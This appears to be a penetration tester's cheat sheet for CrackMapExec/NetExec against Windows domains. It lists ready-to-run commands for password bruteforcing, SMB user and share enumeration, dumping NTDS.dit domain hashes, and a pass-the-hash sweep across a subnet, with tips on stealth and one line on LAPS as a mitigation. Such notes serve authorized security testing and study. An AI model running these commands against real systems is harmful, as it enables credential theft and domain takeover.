CrackMapExec (or the new fork NetExec) is a very powerful tool for Windows domain enumeration and bruteforcing, with lots of options to play with. 

## Bruteforcing (Simple)
```shell
crackmapexec <protocol> <IP> -u <username or userlist> -p <password or passwordlist> # Bruteforce a protocol with CME
```
## SMB Mode
```shell
crackmapexec smb 172.16.5.5 --users
# Enumerate number of bad password attempts
crackmapexec smb <DC_IP> -u <username> -p <password> --users # Enumerate Domain Users #withcreds
crackmapexec smb <DC_IP> -u <username> -p <password> --groups # Enumerate Domain Groups
crackmapexec smb <DC_IP> -u <username> -p <password> --loggedon-users # Enumerate Domain Users who are currently logged on
crackmapexec smb <DC_IP> -u <username> -p <password> --shares # Enumerate Domain shares
crackmapexec smb <DC_IP> -u <username> -p <password> -M spider_plus --share <share name> # Spider SMB share for all readable files
crackmapexec smb <DC_IP> -u <username> -p <password> --ntds # Dump NTDS.dit and print all domain hashes
```

## If you have an NT hash of a local admin:

```shell-session
# Trying once on each machine (--local-auth) to see if the administrators hash is used elsewhere. Grep for sucessful logins.

sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

==The above command is noisy!== Do not use if you are trying to be stealthy. One way to mitigate this is to use Local Administrator Password Solution (LAPS) to have AD enforce a unique password on each host.

https://github.com/Pennyw0rth/NetExec

